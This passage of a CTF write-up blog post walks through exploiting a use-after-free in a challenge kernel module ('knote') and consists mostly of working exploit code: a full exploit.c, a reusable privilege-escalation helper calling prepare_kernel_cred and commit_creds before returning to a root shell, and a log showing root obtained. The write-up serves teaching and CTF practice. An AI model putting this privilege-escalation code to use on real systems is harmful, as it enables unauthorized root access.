</code></pre><figcaption><p><span style="white-space: pre-wrap;">The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>KNOTE_ENCRYPT</span></code><span style="white-space: pre-wrap;"> command</span></p></figcaption></figure><p>This means that we can execute arbitrary code by committing a UAF bug, overwrite <code>knote-&gt;encrypt_func</code> and calling it. </p><h2 id="creating-an-exploit">Creating an exploit</h2><p>So now we have our primitives to get local code execution through a UAF bug in the kernel module, we can start building the exploit. Firstly, I defined a bunch of kernel module specific code, such as the structures and <code>ioctl()</code> calls to interact with the kmodule. These structures are copy/pasted from the <code>knote.c</code> file.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">int FD_KNOTE;

enum knote_ioctl_cmd {
    KNOTE_CREATE = 0x1337,
    KNOTE_DELETE = 0x1338,
    KNOTE_READ = 0x1339,
    KNOTE_ENCRYPT = 0x133a,
    KNOTE_DECRYPT = 0x133b
};


typedef struct {
    unsigned long idx;
    char * data;
    size_t len;
} knote_user_t;


typedef struct {
    char *data;
    size_t len;
    void (*encrypt_func)(char *, size_t);
    void (*decrypt_func)(char *, size_t);
} knote_t;


void cmd_send(unsigned long cmd, unsigned long idx, char* data, size_t len)
{
    knote_user_t user;
    user.idx = idx;
    user.data = data;
    user.len = len;

    int retv = ioctl(FD_KNOTE, cmd, &amp;user);
    printf("ioctl(fd=%d, cmd=0x%x, &amp;ku=%p) -&gt; %d\n", FD_KNOTE, cmd, &amp;user, retv);
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">The contextual part of the exploit</span></p></figcaption></figure><p>After I got all necessary kernel module code, I created the UAF code. Please ignore the <code>set_ctx_reg()</code> and <code>&amp;privesc_ctx_swp</code>  variables. As you can see, we're firstly triggering the swap by allocating a knote with an invalid data pointer so that <code>kn-&gt;data</code> becomes <code>kn</code>. Then, we're allocating our custom <code>kn</code> by passing it as <code>kn-&gt;data</code>. Please note that I'm using knote index 1, and not 0 to prevent <code>encrypt_func</code> from being overwritten in the following code of <code>knote.c</code>:</p><figure class="kg-card kg-code-card"><pre><code>switch(cmd) {
    case KNOTE_CREATE:
		// copy userdata to note data
        knotes[ku.idx]-&gt;data = data;
        knotes[ku.idx]-&gt;len = ku.len;
        if(copy_from_user(knotes[ku.idx]-&gt;data, ku.data, ku.len)) {
            kfree(knotes[ku.idx]-&gt;data);
            kfree(knotes[ku.idx]);
            mutex_unlock(&amp;knote_ioctl_lock);
            return -EFAULT;
        }
        knotes[ku.idx]-&gt;encrypt_func = knote_encrypt;
        knotes[ku.idx]-&gt;decrypt_func = knote_decrypt;
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">The code overwriting </span><code spellcheck="false" style="white-space: pre-wrap;"><span>encrypt_func</span></code></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-c">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/xattr.h&gt;
#include &lt;unistd.h&gt;
#include "kpwn.c"


int FD_KNOTE;

enum knote_ioctl_cmd {
    // ...
};


typedef struct {
    // ...
} knote_user_t;


typedef struct {
    // ...
} knote_t;


void cmd_send(unsigned long cmd, unsigned long idx, char* data, size_t len)
{
	// ...
}

void main()
{
    FD_KNOTE = open("/dev/knote", O_RDONLY);
    if (FD_KNOTE &lt; 0)
    {
        puts("main(): open failed");
        exit(1);
    }

    /* case KNOTE_CREATE:
     *     char *data = kmalloc(ku.len, GFP_KERNEL);
     *     knotes[ku.idx] = kmalloc(sizeof(struct knote), GFP_KERNEL);
     *     knotes[ku.idx]-&gt;data = data;
     *     knotes[ku.idx]-&gt;len = len;
     *     if (copy_from_user(knotes[ku.idx]-&gt;data, ku.data, ku.len)) 
     *     {
     *         kfree(knotes[ku.idx]-&gt;data);
     *         kfree(knotes[ku.idx]);
     *         return -EFAULT;
     *     }
     *
     *      knotes[ku.idx]-&gt;encrypt_func = knote_encrypt;
     *      knotes[ku.idx]-&gt;decrypt_func = knote_decrypt;
     *
     * doesn't reset ku.idx upon fail, does 1 kmalloc
     * note: kmalloc(data) used to fill kfree(knote)
     */

    puts("[*] creating note 0: fail pls");
    cmd_send(KNOTE_CREATE, 0, (void*)0x1337, 32);
 
    set_ctx_reg();

    knote_t payload_knote;
    payload_knote.data = "idc3";
    payload_knote.len = 5;
    payload_knote.encrypt_func = &amp;privesc_ctx_swp;
    payload_knote.decrypt_func = &amp;privesc_ctx_swp;

    prepare_kernel_cred = 0xffffffff81053c50;
    commit_creds = 0xffffffff81053a30;

    printf("[*] new knote_t size: %lu\n", sizeof(knote_t));
    puts("[*] allocating malicious payload knote");
    cmd_send(KNOTE_CREATE, 1, &amp;payload_knote, 32);
    
    // ...
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">The new code that triggers UAF</span></p></figcaption></figure><p>Then, we're triggering the function call to <code>encrypt_func</code> by using <code>KNOTE_ENCRYPT</code>:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/xattr.h&gt;
#include &lt;unistd.h&gt;
#include "kpwn.c"


int FD_KNOTE;

enum knote_ioctl_cmd {
    // ...
};


typedef struct {
    // ...
} knote_user_t;


typedef struct {
    // ...
} knote_t;


void cmd_send(unsigned long cmd, unsigned long idx, char* data, size_t len)
{
    // ...
}

void main()
{
    // ...
    
    /* case KNOTE_ENCRYPT:
     *     if (ku.idx &gt;= 10 || !knotes[ku.idx]) 
     *     {
     *         mutex_unlock(&amp;knote_ioctl_lock);
     *         return -EINVAL;
     *     }
     *     knotes[ku.idx]-&gt;encrypt_func(knotes[ku.idx]-&gt;data, knotes[ku.idx]-&gt;len);
     * 
     * trigger function call to encrypt_fun
     */
    puts("[*] calling (hopefully overwrited) encrypt function");
    cmd_send(KNOTE_ENCRYPT, 0, "idc4", 5);

    puts("[-] exploit failed :(");
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">The code triggering the exploit</span></p></figcaption></figure><p>Now, coming back to <code>set_ctx_reg()</code> and <code>privesc_ctx_swp()</code>. When we commit the code execution attack in the kmodule, we are in <strong>kernel space </strong>whilst we want to run a shell as <strong>root</strong> in <strong>userland</strong>. In order to get our beloved shell, we need to perform a <strong>context swap</strong> from kernel to userland. Such context swaps happen with every system call being made in the kernel so it's very important. In order to keep this write-up relatively short, you can read more about context swapping in the <a href="https://medium.com/geekculture/linux-cpu-context-switch-deep-dive-764bfdae4f01" rel="noreferrer">context swapping blogpost</a> by geekculture. </p><p>Since these functions are very standard and used in most kernel pwn challenges I made it a header file:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">long prepare_kernel_cred = 0xDEADC0D3;
long commit_creds = 0xDEADC0DE;
long _proc_cs, _proc_ss, _proc_rsp, _proc_rflags = 0;

void set_ctx_reg() {
    __asm__(".intel_syntax noprefix;"
            "mov _proc_cs, cs;"
            "mov _proc_ss, ss;"
            "mov _proc_rsp, rsp;"
            "pushf;" // push rflags
            "pop _proc_rflags;"
            ".att_syntax");

    printf("[+] CS: 0x%lx, SS: 0x%lx, RSP: 0x%lx, RFLAGS: 0x%lx\n", _proc_cs, _proc_ss, _proc_rsp, _proc_rflags);
}


void spawn_shell()
{
    puts("[+] Hello Userland!");
    int uid = getuid();
    if (uid == 0)
        printf("[+] UID: %d (root poggers)\n", uid);
    else {
        printf("[!] UID: %d (epic fail)\n", uid);
    }

    puts("[*] starting shell");
    system("/bin/sh");

    puts("[*] quitting exploit");
    exit(0); // avoid ugly segfault
}

void privesc_ctx_swp()
{
    __asm__(".intel_syntax noprefix;"
            /**
             * struct cred *prepare_kernel_cred(struct task_struct *daemon)
             * @daemon: A userspace daemon to be used as a reference
             *
             * If @daemon is supplied, then the security data will be derived from that;
             * otherwise they'll be set to 0 and no groups, full capabilities and no keys.
             *
             * Returns the new credentials or NULL if out of memory.
             */
            "xor rdi, rdi;"
            "movabs rax, prepare_kernel_cred;"
            "call rax;" // prepare_kernel_cred(0)

            /**
             * int commit_creds(struct cred *new)
             * @new: The credentials to be assigned
             */
            "mov rdi, rax;" // RAX contains cred pointer
            "movabs rax, commit_creds;"
            "call rax;"

            // setup the context swapping
            "swapgs;" // swap GS to userland

            "mov r15, _proc_ss;"
            "push r15;"
            "mov r15, _proc_rsp;"
            "push r15;"
            "mov r15, _proc_rflags;"
            "push r15;"
            "mov r15, _proc_cs;"
            "push r15;"
            "lea r15, spawn_shell;" // lea rip, spawn_shell ; when returning to userland
            "push r15;"
            "iretq;" // swap context to userland
            ".att_syntax;");
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">Content of </span><code spellcheck="false" style="white-space: pre-wrap;"><span>kpwn.c</span></code></p></figcaption></figure><p>Basically in a nutshell, the context swap requires the registers <code>ss</code>, <code>rsp</code>, <code>rflags</code> and <code>cs</code> <strong>from userland</strong>, since they are mission critical for returning to userland context. We store those registers in the <code>set_ctx_reg()</code> function:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">long _proc_cs, _proc_ss, _proc_rsp, _proc_rflags = 0;

void set_ctx_reg() {
    __asm__(".intel_syntax noprefix;"
            "mov _proc_cs, cs;"
            "mov _proc_ss, ss;"
            "mov _proc_rsp, rsp;"
            "pushf;" // push rflags
            "pop _proc_rflags;"
            ".att_syntax");

    printf("[+] CS: 0x%lx, SS: 0x%lx, RSP: 0x%lx, RFLAGS: 0x%lx\n", _proc_cs, _proc_ss, _proc_rsp, _proc_rflags);
}
</code></pre><figcaption><p><code spellcheck="false" style="white-space: pre-wrap;"><span>set_ctx_reg()</span></code><span style="white-space: pre-wrap;"> content</span></p></figcaption></figure><p>After we set them, we can use our own privesc and context swap function which also sets the new userland execution pointer. Keep in mind that the following code snippet uses global variables in the assembly. The code starts off by calling <code>prepare_kernel_cred(0)</code> (which prepares the credentials to be set to UID 0 and GID 0) and then calls <code>commit_creds(creds)</code> to set the process credentials indefinitely. At last, it prepares the context swap registers and performs the context swap.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">void privesc_ctx_swp()
{
    __asm__(".intel_syntax noprefix;"
            /**
             * struct cred *prepare_kernel_cred(struct task_struct *daemon)
             * @daemon: A userspace daemon to be used as a reference
             *
             * If @daemon is supplied, then the security data will be derived from that;
             * otherwise they'll be set to 0 and no groups, full capabilities and no keys.
             *
             * Returns the new credentials or NULL if out of memory.
             */
            "xor rdi, rdi;"
            "movabs rax, prepare_kernel_cred;"
            "call rax;" // prepare_kernel_cred(0)

            /**
             * int commit_creds(struct cred *new)
             * @new: The credentials to be assigned
             */
            "mov rdi, rax;" // RAX contains cred pointer
            "movabs rax, commit_creds;"
            "call rax;"

            // setup the context swapping
            "swapgs;" // swap GS to userland

            "mov r15, _proc_ss;"
            "push r15;"
            "mov r15, _proc_rsp;"
            "push r15;"
            "mov r15, _proc_rflags;"
            "push r15;"
            "mov r15, _proc_cs;"
            "push r15;"
            "lea r15, spawn_shell;" // lea rip, spawn_shell ; when returning to userland
            "push r15;"
            "iretq;" // swap context to userland
            ".att_syntax;");
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>privesc_ctx_swp()</span></code><span style="white-space: pre-wrap;"> function</span></p></figcaption></figure><p>This sets the new RIP to <code>spawn_shell</code>, which contains our userland code to spawn a shell:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">void spawn_shell()
{
    puts("[+] Hello Userland!");
    int uid = getuid();
    if (uid == 0)
        printf("[+] UID: %d (root poggers)\n", uid);
    else {
        printf("[!] UID: %d (epic fail)\n", uid);
    }

    puts("[*] starting shell");
    system("/bin/sh");

    puts("[*] quitting exploit");
    exit(0); // avoid ugly segfault
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>spawn_shell()</span></code><span style="white-space: pre-wrap;"> function which calls /bin/sh from userland</span></p></figcaption></figure><p>In our exploit we prepared the userland context registers, made a fake UAF knote object that would trigger <code>privesc_ctx_swp</code>, and set the addresses for the kernel functions <code>prepare_kernel_cred</code> and <code>commit_creds</code>. </p><figure class="kg-card kg-code-card"><pre><code class="language-c">    set_ctx_reg();

    knote_t payload_knote;
    payload_knote.data = "idc3";
    payload_knote.len = 5;
    payload_knote.encrypt_func = &amp;privesc_ctx_swp;
    payload_knote.decrypt_func = &amp;privesc_ctx_swp;

    prepare_kernel_cred = 0xffffffff81053c50;
    commit_creds = 0xffffffff81053a30;

    printf("[*] new knote_t size: %lu\n", sizeof(knote_t));
    puts("[*] allocating malicious payload knote");
    cmd_send(KNOTE_CREATE, 1, &amp;payload_knote, 32);
</code></pre><figcaption><p><span style="white-space: pre-wrap;">A subsection of the exploit which sets the privesc up</span></p></figcaption></figure><p>Then, I tested the exploit locally by compiling it using <code>compress.sh</code> (given earlier in this post):</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">~ $ whoami
user
~ $ /exploit
exploit         exploit_easy    exploit_easy.c  exploit_real.c
~ $ /exploit_easy
[*] creating note 0: fail pls
ioctl(fd=3, cmd=0x1337, &amp;ku=0x7fff3d3605c0) -&gt; -1
[+] CS: 0x33, SS: 0x2b, RSP: 0x7fff3d3605e0, RFLAGS: 0x246
[*] new knote_t size: 32
[*] allocating malicious payload knote
ioctl(fd=3, cmd=0x1337, &amp;ku=0x7fff3d3605c0) -&gt; 0
[*] calling (hopefully overwrited) encrypt function
[+] Hello Userland!
[+] UID: 0 (root poggers)
[*] starting shell
/bin/sh: can't access tty; job control turned off
/home/user # whoami
root
/home/user #</code></pre><figcaption><p><span style="white-space: pre-wrap;">Exploit proof-of-concept (PoC)</span></p></figcaption></figure><p>If you want to try the exploit yourself, here's the complete source code for <code>exploit.c</code>:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/xattr.h&gt;
#include &lt;unistd.h&gt;
#include "kpwn.c"


int FD_KNOTE;

enum knote_ioctl_cmd {
    KNOTE_CREATE = 0x1337,
    KNOTE_DELETE = 0x1338,
    KNOTE_READ = 0x1339,
    KNOTE_ENCRYPT = 0x133a,
    KNOTE_DECRYPT = 0x133b
};


typedef struct {
    unsigned long idx;
    char * data;
    size_t len;
} knote_user_t;


typedef struct {
    char *data;
    size_t len;
    void (*encrypt_func)(char *, size_t);
    void (*decrypt_func)(char *, size_t);
} knote_t;


void cmd_send(unsigned long cmd, unsigned long idx, char* data, size_t len)
{
    knote_user_t user;
    user.idx = idx;
    user.data = data;
    user.len = len;

    int retv = ioctl(FD_KNOTE, cmd, &amp;user);
    printf("ioctl(fd=%d, cmd=0x%x, &amp;ku=%p) -&gt; %d\n", FD_KNOTE, cmd, &amp;user, retv);
}

void main()
{
    FD_KNOTE = open("/dev/knote", O_RDONLY);
    if (FD_KNOTE &lt; 0)
    {
        puts("main(): open failed");
        exit(1);
    }

    /* case KNOTE_CREATE:
     *     char *data = kmalloc(ku.len, GFP_KERNEL);
     *     knotes[ku.idx] = kmalloc(sizeof(struct knote), GFP_KERNEL);
     *     knotes[ku.idx]-&gt;data = data;
     *     knotes[ku.idx]-&gt;len = len;
     *     if (copy_from_user(knotes[ku.idx]-&gt;data, ku.data, ku.len)) 
     *     {
     *         kfree(knotes[ku.idx]-&gt;data);
     *         kfree(knotes[ku.idx]);
     *         return -EFAULT;
     *     }
     *
     *      knotes[ku.idx]-&gt;encrypt_func = knote_encrypt;
     *      knotes[ku.idx]-&gt;decrypt_func = knote_decrypt;
     *
     * doesn't reset ku.idx upon fail, does 1 kmalloc
     * note: kmalloc(data) used to fill kfree(knote)
     */

    puts("[*] creating note 0: fail pls");
    cmd_send(KNOTE_CREATE, 0, (void*)0x1337, 32);
 
    set_ctx_reg();

    knote_t payload_knote;
    payload_knote.data = "idc3";
    payload_knote.len = 5;
    payload_knote.encrypt_func = &amp;privesc_ctx_swp;
    payload_knote.decrypt_func = &amp;privesc_ctx_swp;

    prepare_kernel_cred = 0xffffffff81053c50;
    commit_creds = 0xffffffff81053a30;

    printf("[*] new knote_t size: %lu\n", sizeof(knote_t));
    puts("[*] allocating malicious payload knote");
    cmd_send(KNOTE_CREATE, 1, &amp;payload_knote, 32);
    
    /* case KNOTE_ENCRYPT:
     *     if (ku.idx &gt;= 10 || !knotes[ku.idx]) 
     *     {
     *         mutex_unlock(&amp;knote_ioctl_lock);
     *         return -EINVAL;
     *     }
     *     knotes[ku.idx]-&gt;encrypt_func(knotes[ku.idx]-&gt;data, knotes[ku.idx]-&gt;len);
     * 
     * trigger function call to encrypt_fun
     */
    puts("[*] calling (hopefully overwrited) encrypt function");
    cmd_send(KNOTE_ENCRYPT, 0, "idc4", 5);

    puts("[-] exploit failed :(");
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">Complete </span><code spellcheck="false" style="white-space: pre-wrap;"><span>exploit.c</span></code></p></figcaption></figure><p>Now it's time to perform the exploit on the remote machine. I wisely chose <code>musl-gcc</code> as the compiler in <code>compress.sh</code> since it decreases the size of static builds A LOT. The static binary sizes from <code>gcc</code> and <code>musl-gcc</code> are respectfully <code>800000</code> bytes and <code>34000</code> bytes. In order to transfer the exploit to the remote machine, I used <code>encode.sh</code> to encode the exploit binary, <strong>copy it to clipboard</strong> and decoded it using BASH utilities on the remote machine:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">tar -czO $1 | base64 -w160


echo "\n\n===== TO DECODE =====" &gt; /dev/stderr
echo "echo &lt;...&gt; | base64 -d | tar -xzO &gt; exploit" &gt; /dev/stderr
</code></pre><figcaption><p><span style="white-space: pre-wrap;">The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>encode.sh</span></code><span style="white-space: pre-wrap;"> used to transfer files from local machine to the remote CTF box</span></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ encode.sh initramfs/exploit | xsel -b


===== TO DECODE =====
echo &lt;...&gt; | base64 -d | tar -xzO &gt; exploit</code></pre><figcaption><p><span style="white-space: pre-wrap;">Proof-of-concept of </span><code spellcheck="false" style="white-space: pre-wrap;"><span>encode.sh</span></code><span style="white-space: pre-wrap;"> to encode the binary</span></p></figcaption></figure><h2 id="afterword">Afterword</h2><p>I really hope you enjoyed the challenge and write-up as much as I did. Please let me know on <a href="https://twitter.com/notselwyn">Twitter</a> if you want me to make a write-up about exploiting this CTF with <em>real</em> kernel primitives like <code>seq_operations</code> and <code>setxattr</code>. </p><p>If you like this pwn content, please checkout the <a href="https://10.10.11.7/blacksmith/">HackTheBox - Blacksmith</a> write-up, or checkout the <a href="https://10.10.11.7/tag/heap-memory">Heap Memory</a> and <a href="https://10.10.11.7/tag/linux-kernel/">Linux Kernel </a>tag pages on the site to read more kernel related blogposts. </p>
    </section>


</article>
</main>




            <aside class="read-more-wrap outer">
                <div class="read-more inner">
                        
<article class="post-card post featured no-image">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/ksmbd-syzkaller/">
            <header class="post-card-header">
                <div class="post-card-tags">
                        <span class="post-card-featured"><svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M4.49365 4.58752C3.53115 6.03752 2.74365 7.70002 2.74365 9.25002C2.74365 10.6424 3.29678 11.9778 4.28134 12.9623C5.26591 13.9469 6.60127 14.5 7.99365 14.5C9.38604 14.5 10.7214 13.9469 11.706 12.9623C12.6905 11.9778 13.2437 10.6424 13.2437 9.25002C13.2437 6.00002 10.9937 3.50002 9.16865 1.68127L6.99365 6.25002L4.49365 4.58752Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
</svg> Featured</span>
                </div>
                <h2 class="post-card-title">
                    Tickling ksmbd: fuzzing SMB in the Linux kernel
                </h2>
            </header>
                <div class="post-card-excerpt">Following the adventure of manually discovering network-based vulnerabilities in the Linux kernel, I'm adding ksmbd-fuzzing functionality to the already extensive kernel-fuzzing tool that is Syzkaller.</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2023-09-16">Sep 16, 2023</time>
                <span class="post-card-meta-length">7 min read</span>
        </footer>

    </div>

</article>
                        
<article class="post-card post featured no-image">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/ksmbd/">
            <header class="post-card-header">
                <div class="post-card-tags">
                        <span class="post-card-featured"><svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M4.49365 4.58752C3.53115 6.03752 2.74365 7.70002 2.74365 9.25002C2.74365 10.6424 3.29678 11.9778 4.28134 12.9623C5.26591 13.9469 6.60127 14.5 7.99365 14.5C9.38604 14.5 10.7214 13.9469 11.706 12.9623C12.6905 11.9778 13.2437 10.6424 13.2437 9.25002C13.2437 6.00002 10.9937 3.50002 9.16865 1.68127L6.99365 6.25002L4.49365 4.58752Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
</svg> Featured</span>
                </div>
                <h2 class="post-card-title">
                    Unleashing ksmbd: remote exploitation of the Linux kernel (ZDI-23-979, ZDI-23-980)
                </h2>
            </header>
                <div class="post-card-excerpt">December 22nd 2022: it's Christmas Thursday, one of the last workdays before the Christmas vacation starts. Whilst everyone was looking forward to opening presents from friends and family, the Zero Day Initiative decided to give the IT community a present as well: immense stress in the form of ZDI-22-1690, an</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2023-08-04">Aug 4, 2023</time>
                <span class="post-card-meta-length">10 min read</span>
        </footer>

    </div>

</article>
                        
<article class="post-card post no-image">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/cve-2022-46640/">
            <header class="post-card-header">
                <div class="post-card-tags">
                </div>
                <h2 class="post-card-title">
                    How I hacked IoT management apps: the story behind CVE-2022-46640
                </h2>
            </header>
                <div class="post-card-excerpt">Have you ever wondered how secure desktop applications really are? Recently, we put one of them to the test and found some critical vulnerabilities such as unauthenticated Remote Code Execution (CVE-2022-46640), Local File Inclusion and Remote Wireless Reconfiguration which allowed us to remotely compromise the Windows desktop. In this blogpost,</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2023-03-08">Mar 8, 2023</time>
                <span class="post-card-meta-length">8 min read</span>
        </footer>

    </div>

</article>
                </div>
            </aside>



    </div>

    <footer class="site-footer outer">
        <div class="inner">
            <section class="copyright"><a href="https://10.10.11.7">Pwning Tech</a> &copy; 2024</section>
            <nav class="site-footer-nav">
                
            </nav>
            <div class="gh-powered-by"><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
        </div>
    </footer>

</div>

    <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="pswp__bg"></div>

    <div class="pswp__scroll-wrap">
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>
<script
    src="https://code.jquery.com/jquery-3.5.1.min.js"
    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
    crossorigin="anonymous">
</script>
<script src="/assets/built/casper.js?v=01ef4b6923"></script>
<script>
$(document).ready(function () {
    // Mobile Menu Trigger
    $('.gh-burger').click(function () {
        $('body').toggleClass('gh-head-open');
    });
    // FitVids - Makes video embeds responsive
    $(".gh-content").fitVids();
});
</script>

<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js" integrity="sha512-AKaNmg8COK0zEbjTdMHJAPJ0z6VeNqvRvH4/d5M4sHJbQQUToMBtodq4HaV4fa+WV2UTfoperElm66c9/8cKmQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js" integrity="sha512-8VrjxGFLIkS0mgEmO3p46A5OkqATHhrNVwyv2V7yUeZrk1jmSDuI3SOEpC9XHEHUWEOsfzzcJeBlUkee9lKGrw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js" integrity="sha512-whYhDwtTmlC/NpZlCr6PSsAaLOrfjVg/iXAnC4H/dtiHawpShhT2SlIMbpIhT/IL/NrpdMm+Hq2C13+VKpHTYw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-markup-templating.min.js" integrity="sha512-+8BiRfWso6waiFDv6tEmWF8yfPGgxAtOYLDUB0rRISLwtpxkJ9lpPNUhxwWlikn3qSO+4RQyzDppi62o3ON/AA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js" integrity="sha512-plzrTi61ltEMFf84gTVO9IkvIMfBu07bnDuahvdlIclmFWzXJ9VcRsny9d45sxFZRv3jJg/MHNyuxnUYEMxMEg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-http.min.js" integrity="sha512-3KphgbiKTzK2CNxlSgUKypipTV7tWknO5czNb+E7H4CeHOOSer2s2rIOCTuz8NsY1zm+B9tP9Ul2JX/tmdyOYg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-json.min.js" integrity="sha512-QXFMVAusM85vUYDaNgcYeU3rzSlc+bTV4JvkfJhjxSHlQEo+ig53BtnGkvFTiNJh8D+wv6uWAQ2vJaVmxe8d3w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-diff.min.js" integrity="sha512-tBR4SAva+2bw36ToxaFeOEvgqxWHON25E9xp+kEBfw175sS5OusQEH8GrigKgTdHUXcKsK1yiyfo7fctBYl+rA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-toml.min.js" integrity="sha512-R9JG7uVdcjWlZvEWyP3KfxtexvT1uIlKUF/dYVmZRbvJyMobK6zGCpIM2gLVqYjLSYeL/zBjOVpP7vXxVtzfCw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.js" integrity="sha512-BttltKXFyWnGZQcRWj6osIg7lbizJchuAMotOkdLxHxwt/Hyo+cl47bZU0QADg+Qt5DJwni3SbYGXeGMB5cBcw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script>
    $("pre").addClass("line-numbers");
</script>

<script>
      $('.gh-content').prepend('<aside class="gh-sidebar"><div class="gh-toc"></div></aside>');
</script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.3/tocbot.min.js"></script>
<script>
    tocbot.init({
        tocSelector: '.gh-toc',
        contentSelector: '.gh-content',
        headingSelector: 'h1, h2, h3, h4',
        hasInnerContainers: true,
  		collapseDepth: 2
    });
</script>

<script>
      $('.gh-toc').prepend('<h5>Table of contents</h5>');
</script>

<script>
  $('.gh-burger').attr('aria-label', 'menu button');
  $('.gh-search').attr('aria-label', 'search button');
  $(".author-name a").attr("aria-label", "author notselwyn");
  $(".author-profile-image").attr("aria-label", "author notselwyn");
</script>

</body>
</html>
